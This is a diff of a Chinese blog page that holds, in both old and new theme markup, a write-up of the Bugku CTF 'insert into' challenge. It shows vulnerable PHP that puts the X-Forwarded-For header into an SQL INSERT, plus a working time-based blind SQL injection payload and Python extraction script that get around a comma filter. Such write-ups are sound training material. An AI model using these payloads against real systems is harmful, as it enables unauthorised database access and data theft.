@@ -1,402 +1,213 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
+
+
+
+
+
+
+
+
+
+
 <head><meta name="generator" content="Hexo 3.8.0">
-  <meta charset="utf-8">
-  
-  <title>bugku insert into 注入 | chuddy&#39;s Blog</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  
-    <meta name="keywords" content="chuddy's Blog">
-  
-  <meta name="description" content="INSERT INTO 注入">
-<meta name="keywords" content="writeup">
-<meta property="og:type" content="article">
-<meta property="og:title" content="bugku insert into 注入">
-<meta property="og:url" content="http://yoursite.com/2018/05/10/bugku-insert-into-注入/index.html">
-<meta property="og:site_name" content="chuddy&#39;s Blog">
-<meta property="og:description" content="INSERT INTO 注入">
-<meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-05-09T05:03:00.360Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="bugku insert into 注入">
-<meta name="twitter:description" content="INSERT INTO 注入">
-  
-  
-    <link rel="icon" href="/favicon.ico">
-  
-  <link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
-  <link rel="stylesheet" href="/css/style.css">
-  <script src="/js/pace.min.js"></script>
-  
-
-  
-  
-
+    <meta charset="utf-8">
+    <link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" href="/favicon.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="description" content="">
+    <meta name="author" content="chuddy">
+    <meta name="keywords" content="">
+    <title>bugku insert into 注入 ~ chuddy&#39;s Blog</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.7.2/css/all.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/mdb.min.css">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="https://at.alicdn.com/t/font_1067060_vr10bjtg3us.css">
+    
+        <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+    
 </head>
-</html>
+
 <body>
-  <div id="container">
-      <header id="header">
-    <div id="banner"></div>
-    <div id="header-outer">
-        <div id="header-menu" class="header-menu-pos animated">
-            <div class="header-menu-container">
-                <a href="/" class="left">
-                    <span class="site-title">一个专注 WEB 安全的技术博客</span>
-                </a>
-                <nav id="header-menu-nav" class="right">
-                    
-                    <a href="/">
-                        <i class="fa fa-home"></i>
-                        <span>Home</span>
-                    </a>
-                    
-                    <a href="/archives">
-                        <i class="fa fa-archive"></i>
-                        <span>Archives</span>
-                    </a>
-                    
-                    <a href="/about">
-                        <i class="fa fa-user"></i>
-                        <span>About</span>
-                    </a>
-                    
-                </nav>
-                <a class="mobile-header-menu-button">
-                    <i class="fa fa-bars"></i>
-                </a>
-            </div>
-        </div>
-        <div id="header-row">
-            <div id="logo">
-                <a href="/">
-                    <img src="/images/logo.png" alt="logo">
-                </a>
-            </div>
-            <div class="header-info">
-                <div id="header-title">
-                    
-                    <h2>
-                        一个专注 WEB 安全的技术博客
-                    </h2>
-                    
-                </div>
-                <div id="header-description">
-                    
-                </div>
-            </div>
-            <nav class="header-nav">
-                <div class="social">
-                    
-                        <a title="chuddy" target="_blank" href="//chuddyli.github.io">
-                            <i class="fa fa-home fa-2x"></i></a>
-                    
-                        <a title="Github" target="_blank" href="//github.com/chuddyli">
-                            <i class="fa fa-github fa-2x"></i></a>
-                    
-                </div>
-            </nav>
-        </div>
-    </div>
-</header>
-      <div class="outer">
-        <section id="main" class="body-wrap"><article id="post-bugku-insert-into-注入" class="article article-type-post" itemscope="" itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 class="post-title" itemprop="name">
-      bugku insert into 注入
-    </h1>
-    <div class="post-title-bar">
-      <ul>
-          
-        <li>
-          <i class="fa fa-calendar"></i>  2018-05-10
-        </li>
-        <li>
-          <i class="fa fa-eye"></i>
-          <span id="busuanzi_value_page_pv"></span>
-        </li>
-      </ul>
-    </div>
-  
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+<div class="container">
+    <a class="navbar-brand" href="/"><strong>chuddy&#39;s Blog</strong></a>
 
-          
-      </header>
-    
-    <div class="article-entry post-content" itemprop="articleBody">
-      
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+        <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <ul class="navbar-nav ml-auto text-center">
             
-            <h2 id="INSERT-INTO-注入"><a href="#INSERT-INTO-注入" class="headerlink" title="INSERT INTO 注入"></a>INSERT INTO 注入</h2><a id="more"></a>
-<p>打开题目 已经给出源码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">function getIp()&#123;</span><br><span class="line">$ip = &apos;&apos;;</span><br><span class="line">if(isset($_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]))&#123;</span><br><span class="line">$ip = $_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$ip = $_SERVER[&apos;REMOTE_ADDR&apos;];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr = explode(&apos;,&apos;, $ip);</span><br><span class="line">return $ip_arr[0];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host=&quot;localhost&quot;;</span><br><span class="line">$user=&quot;&quot;;</span><br><span class="line">$pass=&quot;&quot;;</span><br><span class="line">$db=&quot;&quot;;</span><br><span class="line"></span><br><span class="line">$connect = mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) or die(&quot;Unable to select database&quot;);</span><br><span class="line"></span><br><span class="line">$ip = getIp();</span><br><span class="line">echo &apos;your ip is :&apos;.$ip;</span><br><span class="line">$sql=&quot;insert into client_ip (ip) values (&apos;$ip&apos;)&quot;;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure>
-<p>这里可以看出注入点在最后的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;insert into client_ip (ip) values (&apos;$ip&apos;)&quot;;</span><br><span class="line">`</span><br></pre></td></tr></table></figure></p>
-<p>$ip 可以通过 X-ForWarded-For 伪造IP 来进行http头注入</p>
-<p>由于没有回显 也屏蔽了报错 所以只能考虑基于时间的盲注</p>
-<p>之前时间延时盲注都是用的 <code>if(exp1,exp2,exp3)</code> 但是这次 他将’,’ 过滤了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ip_arr = explode(&apos;,&apos;, $ip);</span><br><span class="line">return $ip_arr[0];</span><br></pre></td></tr></table></figure></p>
-<p>所以用 <code>case when exp1 then sleep(4) else 1 end</code>来绕过 “,”的限制</p>
-<p>exp1 中要用到substr来进行剪切，这个函数<code>substr(str,1,1)</code> 又是存在 “,” , 于是这里我又用 <code>substr (str) from 1 for 1</code> 来绕过 “,”的限制</p>
-<p>构成的完整语句为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into client_ip (ip) values (&apos;  1&apos; and (case when (length((select database())) = 14) then sleep(4) else 1 end) #  &apos;)</span><br></pre></td></tr></table></figure></p>
-<p>最后附上脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&quot;http://123.206.87.240:8002/web15/&quot;</span><br><span class="line"></span><br><span class="line">flag=&quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(1,6):</span><br><span class="line">    for str1 in &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,!@#$%^&amp;*``.&quot;:</span><br><span class="line">    	#data = &quot;11&apos;and (case when (substr((select group_concat(table_name) from information_schema.tables where table_schema=database() ) from &quot; + str(i) + &quot; for 1 )=&apos;&quot; + str1 + &quot;&apos;) then sleep(4) else 1 end )) #&quot;</span><br><span class="line">		#client_ip,flag</span><br><span class="line">		#data = &quot;11&apos; and (case when (substr((select group_concat(column_name) from information_schema.columns where table_name=&apos;flag&apos;) from &quot; + str(i) + &quot; for 1 )=&apos;&quot; + str1 + &quot;&apos;) then sleep(4) else 1 end )) #&quot;</span><br><span class="line">		#flag</span><br><span class="line">        data = &quot;11&apos; and (case when (substr((select group_concat(flag) from flag) from &quot; + str(i) + &quot; for 1 )=&apos;&quot; + str1 + &quot;&apos;) then sleep(4) else 1 end )) #&quot;</span><br><span class="line">        headers=&#123;&apos;X-ForWarded-For&apos;:data&#125;</span><br><span class="line">        try:</span><br><span class="line">            result=requests.get(url,headers=headers,timeout=3)</span><br><span class="line">        except requests.exceptions.ReadTimeout:</span><br><span class="line">            flag+=str1</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">print flag</span><br></pre></td></tr></table></figure></p>
-
-            <div class="post-copyright">
-    <div class="content">
-        <p>最后更新： 2019年05月09日 13:03</p>
-        <p>原始链接： <a class="post-url" href="/2018/05/10/bugku-insert-into-注入/" title="bugku insert into 注入">http://yoursite.com/2018/05/10/bugku-insert-into-注入/</a></p>
-        <footer>
-            <a href="http://yoursite.com">
-                <img src="/images/logo.png" alt="chuddy">
-                chuddy
-            </a>
-        </footer>
-    </div>
-</div>
-
-      
-        
+            <li class="nav-item">
+                <a class="nav-link" href="/">Home</a>
+            </li>
             
-
-        
-    </div>
-    <footer class="article-footer">
-        
-        
-<div class="post-share">
-    <a href="javascript:;" id="share-sub" class="post-share-fab">
-        <i class="fa fa-share-alt"></i>
-    </a>
-    <div class="post-share-list" id="share-list">
-        <ul class="share-icons">
-          <li>
-            <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2018/05/10/bugku-insert-into-注入/&title=《bugku insert into 注入》 — chuddy's Blog&pic=http://yoursite.comimages/logo.png" data-title="微博">
-              <i class="fa fa-weibo"></i>
-            </a>
-          </li>
-          <li>
-            <a class="weixin share-sns" id="wxFab" href="javascript:;" data-title="微信">
-              <i class="fa fa-weixin"></i>
-            </a>
-          </li>
-          <li>
-            <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2018/05/10/bugku-insert-into-注入/&title=《bugku insert into 注入》 — chuddy's Blog&source=INSERT INTO 注入" data-title="QQ">
-              <i class="fa fa-qq"></i>
-            </a>
-          </li>
-          <li>
-            <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2018/05/10/bugku-insert-into-注入/" data-title="Facebook">
-              <i class="fa fa-facebook"></i>
-            </a>
-          </li>
-          <li>
-            <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《bugku insert into 注入》 — chuddy's Blog&url=http://yoursite.com/2018/05/10/bugku-insert-into-注入/&via=http://yoursite.com" data-title="Twitter">
-              <i class="fa fa-twitter"></i>
-            </a>
-          </li>
-          <li>
-            <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2018/05/10/bugku-insert-into-注入/" data-title="Google+">
-              <i class="fa fa-google-plus"></i>
-            </a>
-          </li>
+            <li class="nav-item">
+                <a class="nav-link" href="/archives/">Archives</a>
+            </li>
+            
         </ul>
-     </div>
-</div>
-<div class="post-modal wx-share" id="wxShare">
-    <a class="close" href="javascript:;" id="wxShare-close">×</a>
-    <p>扫一扫，分享到微信</p>
-    <img src="//api.qrserver.com/v1/create-qr-code/?data=http://yoursite.com/2018/05/10/bugku-insert-into-注入/" alt="微信分享二维码">
+    </div>
 </div>
 
-<div class="mask"></div>
 
-        
-        <ul class="article-footer-menu">
-            
-            
-  <li class="article-footer-tags">
-    <i class="fa fa-tags"></i>
-      
-    <a href="/tags/writeup/" class="color3">writeup</a>
-      
-  </li>
-
-        </ul>
-        
-    </footer>
-  </div>
-</article>
-
-
-    <aside class="post-toc-pos post-toc-top" id="post-toc">
-        <nav class="post-toc-wrap">
-            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#INSERT-INTO-注入"><span class="post-toc-text">INSERT INTO 注入</span></a></li></ol>
-        </nav>
-    </aside>
-    
-
-<nav id="article-nav">
-  
-    <a href="/2018/09/08/文件泄露/" id="article-nav-newer" class="article-nav-link-wrap">
-
-      <span class="article-nav-title">
-        <i class="fa fa-hand-o-left" aria-hidden="true"></i>
-        
-          文件泄露
-        
-      </span>
-    </a>
-  
-  
-    <a href="/2018/05/08/bugku-welcome-to-the-bugkuctf-wp/" id="article-nav-older" class="article-nav-link-wrap">
-      <span class="article-nav-title">bugku welcome to the bugkuctf wp</span>
-      <i class="fa fa-hand-o-right" aria-hidden="true"></i>
-    </a>
-  
 </nav>
-
-
-
-    
-</section>
-        
-      </div>
-      <footer id="footer">
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      
-<p>
-    <span id="busuanzi_container_site_uv" style="display:none">
-        总访客数：<span id="busuanzi_value_site_uv"></span>
-    </span>
-    <span id="busuanzi_container_site_pv" style="display:none">
-        总访问量：<span id="busuanzi_value_site_pv"></span>
-    </span>
-</p>
-
-
-      <p>
-        Powered by  <a href="http://hexo.io/" target="_blank">Hexo</a>
-        Theme <a href="//github.com/wongminho/hexo-theme-miho" target="_blank">MiHo</a>
-      &copy; 2019 chuddy<br>
-      </p>
+    <div class="view intro-2" style='background: url("/post.jpg")no-repeat center center;background-size: cover;'>
+    <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+        <div class="container text-center white-text wow fadeInUp">
+            <p class="h2">bugku insert into 注入</p>
+            <br>
+            
+            <p>Thursday, May 10th 2018, 11:42 pm</p>
+            
+        </div>
+        </div>
     </div>
+    </div>
+  </header>
+
+  <main>
+  
+  <div class="container-fluid">
+    <div class="row">
+        <div class="col-md-8 offset-md-2 ">
+            <div class="post-content py-5 z-depth-3 main">
+                <h2 id="INSERT-INTO-注入"><a href="#INSERT-INTO-注入" class="headerlink" title="INSERT INTO 注入"></a>INSERT INTO 注入</h2><a id="more"></a>
+<p>打开题目 已经给出源码</p>
+<pre><code>error_reporting(0);
+
+function getIp(){
+$ip = &#39;&#39;;
+if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])){
+$ip = $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];
+}else{
+$ip = $_SERVER[&#39;REMOTE_ADDR&#39;];
+}
+$ip_arr = explode(&#39;,&#39;, $ip);
+return $ip_arr[0];
+
+}
+
+$host=&quot;localhost&quot;;
+$user=&quot;&quot;;
+$pass=&quot;&quot;;
+$db=&quot;&quot;;
+
+$connect = mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);
+
+mysql_select_db($db) or die(&quot;Unable to select database&quot;);
+
+$ip = getIp();
+echo &#39;your ip is :&#39;.$ip;
+$sql=&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;;
+mysql_query($sql);
+
+</code></pre><p>这里可以看出注入点在最后的</p>
+<pre><code>$sql=&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;;
+`
+</code></pre><p>$ip 可以通过 X-ForWarded-For 伪造IP 来进行http头注入</p>
+<p>由于没有回显 也屏蔽了报错 所以只能考虑基于时间的盲注</p>
+<p>之前时间延时盲注都是用的 <code>if(exp1,exp2,exp3)</code> 但是这次 他将’,’ 过滤了</p>
+<pre><code>$ip_arr = explode(&#39;,&#39;, $ip);
+return $ip_arr[0];
+</code></pre><p>所以用 <code>case when exp1 then sleep(4) else 1 end</code>来绕过 “,”的限制</p>
+<p>exp1 中要用到substr来进行剪切，这个函数<code>substr(str,1,1)</code> 又是存在 “,” , 于是这里我又用 <code>substr (str) from 1 for 1</code> 来绕过 “,”的限制</p>
+<p>构成的完整语句为</p>
+<pre><code>insert into client_ip (ip) values (&#39;  1&#39; and (case when (length((select database())) = 14) then sleep(4) else 1 end) #  &#39;)
+</code></pre><p>最后附上脚本：</p>
+<pre><code>
+import requests
+
+url=&quot;http://123.206.87.240:8002/web15/&quot;
+
+flag=&quot;&quot;
+
+for i in range(1,6):
+    for str1 in &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,!@#$%^&amp;*``.&quot;:
+        #data = &quot;11&#39;and (case when (substr((select group_concat(table_name) from information_schema.tables where table_schema=database() ) from &quot; + str(i) + &quot; for 1 )=&#39;&quot; + str1 + &quot;&#39;) then sleep(4) else 1 end )) #&quot;
+        #client_ip,flag
+        #data = &quot;11&#39; and (case when (substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;) from &quot; + str(i) + &quot; for 1 )=&#39;&quot; + str1 + &quot;&#39;) then sleep(4) else 1 end )) #&quot;
+        #flag
+        data = &quot;11&#39; and (case when (substr((select group_concat(flag) from flag) from &quot; + str(i) + &quot; for 1 )=&#39;&quot; + str1 + &quot;&#39;) then sleep(4) else 1 end )) #&quot;
+        headers={&#39;X-ForWarded-For&#39;:data}
+        try:
+            result=requests.get(url,headers=headers,timeout=3)
+        except requests.exceptions.ReadTimeout:
+            flag+=str1
+            print flag
+            break
+
+print flag
+
+</code></pre>
+                <hr>
+                <div>
+                    <p>
+                         
+                        <span class="badge badge-light">#&nbsp;writeup</span>
+                        &nbsp;
+                        
+                    </p>
+                </div>
+                <br>
+                
+            </div>
+        </div>
+        <div class="d-none d-md-block col-md-2">
+            
+  <div id="toc" class="py-5">
+    <p class="h6"><i class="iconfont icon-toc" style="vertical-align:middle"></i> Toc:</p> 
+    <div id="tocbot"></div>
+  </div>
+
+        </div>
+    </div>        
+</div>
+
+<br><br><br>
+
+<!-- Comments -->
+<div class="comments" id="comments">
+ 
+</div>
+  
+  </main>
+
+<footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank"><b>HEXO</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/0x2e/Material-T" target="_blank"> <b>Material-T</b></a>
   </div>
 </footer>
-    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-<script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
-<script>
-  var mihoConfig = {
-      root: "http://yoursite.com",
-      animate: true,
-      isHome: false,
-      share: true,
-      reward: 
-  }
-</script>
-<div class="sidebar">
-    <div id="sidebar-search" title="Search">
-        <i class="fa fa-search"></i>
-    </div>
-    <div id="sidebar-category" title="Categories">
-        <i class="fa fa-book"></i>
-    </div>
-    <div id="sidebar-tag" title="Tags">
-        <i class="fa fa-tags"></i>
-    </div>
-    <div id="sidebar-top">
-        <span class="sidebar-top-icon"><i class="fa fa-angle-up"></i></span>
-    </div>
-</div>
-<div class="sidebar-menu-box" id="sidebar-menu-box">
-    <div class="sidebar-menu-box-container">
-        <div id="sidebar-menu-box-categories">
-            <a class="category-link" href="/categories/web/">web</a><a class="category-link" href="/categories/writeup/">writeup</a>
-        </div>
-        <div id="sidebar-menu-box-tags">
-            <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/linux/" style="font-size: 13.33px;">linux</a> <a href="/tags/mysql/" style="font-size: 10px;">mysql</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web漏洞/" style="font-size: 16.67px;">web漏洞</a> <a href="/tags/writeup/" style="font-size: 20px;">writeup</a> <a href="/tags/安全工具/" style="font-size: 10px;">安全工具</a>
-        </div>
-    </div>
-    <a href="javascript:;" class="sidebar-menu-box-close">&times;</a>
-</div>
-<div class="mobile-header-menu-nav" id="mobile-header-menu-nav">
-    <div class="mobile-header-menu-container">
-        <span class="title">Menus</span>
-        <ul class="mobile-header-menu-navbar">
-            
-            <li>
-                <a href="/">
-                    <i class="fa fa-home"></i><span>Home</span>
-                </a>
-            </li>
-            
-            <li>
-                <a href="/archives">
-                    <i class="fa fa-archive"></i><span>Archives</span>
-                </a>
-            </li>
-            
-            <li>
-                <a href="/about">
-                    <i class="fa fa-user"></i><span>About</span>
-                </a>
-            </li>
-            
-        </ul>
-    </div>
-    <div class="mobile-header-tag-container">
-        <span class="title">Tags</span>
-        <div id="mobile-header-container-tags">
-            <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/linux/" style="font-size: 13.33px;">linux</a> <a href="/tags/mysql/" style="font-size: 10px;">mysql</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web漏洞/" style="font-size: 16.67px;">web漏洞</a> <a href="/tags/writeup/" style="font-size: 20px;">writeup</a> <a href="/tags/安全工具/" style="font-size: 10px;">安全工具</a>
-        </div>
-    </div>
-</div>
-<div class="search-wrap">
-    <span class="search-close">&times;</span>
-        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
-            <i class="icon icon-lg icon-chevron-left"></i>
-        </a>
-        <input class="search-field" placeholder="Search..." id="keywords">
-        <a id="search-submit" href="javascript:;">
-            <i class="fa fa-search"></i>
-        </a>
-    <div class="search-container" id="search-container">
-        <ul class="search-result" id="search-result">
-        </ul>
-    </div>
-</div>
 
-<div id="search-tpl">
-    <li class="search-result-item">
-        <a href="{url}" class="search-item-li">
-            <span class="search-item-li-title" title="{title}">{title}</span>
-        </a>
-    </li>
-</div>
-<script src="/js/search.js"></script>
-<script src="/js/main.js"></script>
-
-
-  <script src="//cdn.bootcss.com/particles.js/2.0.0/particles.min.js"></script>
-  <div id="particles"></div>
-  <script src="/js/particles.js"></script>
-
-
-
-
-
-
-
-  <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
-  <script src="//cdn.bootcss.com/scrollReveal.js/3.0.5/scrollreveal.js"></script>
-  <script src="/js/animate.js"></script>
-
-
-  <script src="/js/pop-img.js"></script>
-  <script>
-     $(".article-entry p img").popImg();
-  </script>
-
-  </div>
+  <!-- SCRIPTS -->
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/jquery-3.3.1.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/popper.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/bootstrap.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/js/mdb.min.js"></script>
+  <script src="/js/main.js"></script>
+  
+    
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    
+    <script src="/js/post.js"></script>
+    
+      <script src="/js/plugins/prettify.js"></script>
+      <script>
+          $(document).ready(function(){
+              $('pre').addClass('prettyprint linenums');
+              prettyPrint();
+          })
+      </script>
+    
+  
 </body>
 </html>
